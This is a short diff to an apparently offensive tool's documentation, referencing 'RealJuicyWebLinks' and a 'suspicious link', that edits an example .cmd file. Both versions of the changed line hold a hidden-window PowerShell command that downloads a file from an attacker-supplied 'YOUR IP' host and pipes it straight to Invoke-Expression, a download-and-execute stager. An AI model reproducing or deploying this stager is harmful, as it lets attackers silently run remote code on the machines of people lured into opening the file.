@@ -22,4 +22,4 @@ If you edit RealJuicyWebLinks, the suspicious link may need to be updated as wel
 # Example .cmd
 @echo off
 
-powershell.exe -windowstyle hidden "(iwr https://<YOUR IP>/DIRECTORY/filename -UseBasicParsing) | iex"
+powershell.exe -windowstyle hidden "(iwr https://YOUR IP/DIRECTORY/filename -UseBasicParsing) | iex"
